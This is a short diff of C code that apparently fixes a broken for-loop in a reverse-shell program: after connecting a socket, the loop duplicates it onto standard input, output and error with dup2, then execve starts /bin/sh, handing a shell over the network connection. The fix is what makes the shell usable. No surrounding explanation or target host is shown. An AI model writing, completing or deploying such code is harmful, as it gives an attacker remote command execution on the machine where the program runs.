@@ -13,7 +13,7 @@ int main()
     	connect(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));
 
 	int i;
-	for(i = 0; i++; i <3)
+	for(i = 0; i < 3; i++)
 		dup2(my_socket, i);
 
 	execve("/bin/sh", NULL, NULL);
